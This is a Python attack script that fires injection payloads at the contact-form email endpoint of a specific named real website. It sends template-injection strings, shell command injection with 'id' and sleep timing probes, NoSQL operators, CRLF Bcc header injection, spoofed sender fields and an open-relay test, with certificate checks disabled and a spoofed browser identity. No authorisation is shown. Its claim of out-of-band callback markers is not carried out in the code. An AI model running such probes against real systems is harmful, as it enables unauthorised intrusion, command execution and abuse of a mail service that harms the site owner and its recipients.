#!/usr/bin/env python3
"""
Focused injection probe of the ONLY real server-side handler on the site:
POST /api/send  (Next.js route -> Resend email API).
Tests: SSTI, CMDi, NoSQLi, CRLF/header injection, mass-assignment, and
reflected/differential behaviour of every field. Emits an OOB marker per
payload class so a callback = confirmed.
"""
import requests, urllib3, json, time, sys
urllib3.disable_warnings()
S = requests.Session(); S.verify = False
S.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
URL = 'https://www.infinitycapital.bh/api/send'
OOB = sys.argv[1] if len(sys.argv) > 1 else 'dau2p4ghgqag02k5emggc5hu6hph3m973.oast.abhedi.co.in'
OOB = OOB.rstrip('.')
# rebuild domain correctly
DOM = 'dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'

def post(fields, tag):
    t0 = time.time()
    try:
        r = S.post(URL, data=fields, timeout=30, allow_redirects=False)
    except Exception as e:
        print(f'{tag:28s} EXC {e}'); return None
    dt = time.time() - t0
    body = r.text[:300].replace('\n', ' ')
    print(f'{tag:28s} {r.status_code} {dt:5.2f}s ct={r.headers.get("content-type","")[:30]:30s} {body}')
    return r

base = dict(fname='Alice', lname='Smith', areacode='973', tel='5551234',
            cname='QA Tester', subject='Hello', msg='Body text', check='on',
            targets='probe@example.com')

print('=== BASELINE ===')
post(base, 'baseline')
post({k: v for k, v in base.items() if k != 'msg'}, 'no msg')
post({k: v for k, v in base.items() if k != 'targets'}, 'no targets')
post({**base, 'targets': ''}, 'targets empty')
post({'fname': 'x'}, 'only fname')

print('\n=== SSTI (server-side template) ===')
post({**base, 'cname': '{{7*7}}', 'msg': '${7*7}', 'subject': '<%= 7*7 %>'}, 'ssti basic')
post({**base, 'cname': '#{7*7}', 'msg': '${T(java.lang.Runtime).getRuntime()}'}, 'ssti java/freemarker')

print('\n=== COMMAND INJECTION ===')
post({**base, 'cname': 'a;id;', 'msg': '$(sleep 6)', 'subject': '`id`'}, 'cmdi ;id; $(sleep6) `id`')
t = post({**base, 'msg': 'x' + 'A' * 8 + "'; sleep 8; echo '", 'cname': 'q'}, 'cmdi sleep-8 timing')
print('   ^ baseline time was ~ see above; >5s delta = blind cmdi')

print('\n=== NOSQLI / type juggling ===')
for probe in ['$ne', '{"$ne":null}', '{"$gt":""}', '{"$exists":true}', 'a]||true||[a']:
    post({**base, 'targets': probe, 'cname': probe}, 'nosqli ' + probe[:18])

print('\n=== CRLF / header injection in targets ===')
post({**base, 'targets': 'a@example.com\nBcc: victim@example.com'}, 'crlf \\n Bcc')
post({**base, 'targets': 'a@example.com\r\nBcc:victim@example.com'}, 'crlf \\r\\n Bcc')
post({**base, 'cname': 'x\r\nBcc: victim@example.com'}, 'crlf in cname')

print('\n=== MASS ASSIGNMENT / extra fields ===')
post({**base, 'role': 'admin', 'isAdmin': 'true', 'from': 'attacker@evil.tld',
      'replyTo': 'attacker@evil.tld', 'apiKey': 'x', 'targets': 'probe@example.com,second@example.com'},
    'mass-assign + multi-target')
post({**base, 'targets': 'a@a.com,b@b.com,c@c.com,d@d.com,e@e.com,f@f.com,g@g.com,h@h.com'},
    '8 recipients (relay)')

print('\n=== OOB markers (callback = confirmed) ===')
post({**base, 'cname': 'x', 'msg': 'x'}, 'oob baseline')
